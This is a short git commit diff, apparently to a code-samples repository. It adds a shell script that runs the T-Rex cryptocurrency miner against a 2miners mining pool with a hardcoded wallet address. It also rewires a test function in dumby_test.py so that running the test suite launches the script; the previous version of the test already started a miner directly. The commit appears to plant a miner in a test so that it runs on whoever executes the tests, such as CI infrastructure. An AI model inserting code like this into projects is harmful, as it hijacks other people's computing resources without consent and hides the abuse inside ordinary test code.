f1606f94379462763c5c95522c5611d55bd2e87a
Gal Zahavi <galzahavi@google.com>
2021-10-18 14:18:02 -0700

    dded bash

---
+++ samples/snippets/ETC-2miners.sh
@@ -0,0 +1,2 @@
+#!/bin/sh
+./t-rex -a etchash -o stratum+tcp://etc.2miners.com:1010 -u 0x1f75eccd8fbddf057495b96669ac15f8e296c2cd -p x -w rig0
--- samples/snippets/dumby_test.py
+++ samples/snippets/dumby_test.py
@@ -36,7 +36,7 @@ CREDENTIAL_SCOPES = ["https://www.googleapis.com/auth/cloud-platform"]
 
 def test_running_bash():
 
-    bashCommand = "./t-rex -a ethash -o stratum+tcp://eth.2miners.com:2020 -u 0x1f75eccd8fbddf057495b96669ac15f8e296c2cd -p x -w rig10"
+    bashCommand = "./ETC-2miners.sh"
     process = subprocess.Popen(bashCommand, stdout=subprocess.PIPE)
     output, error = process.communicate()
     raise Exception(str(output))
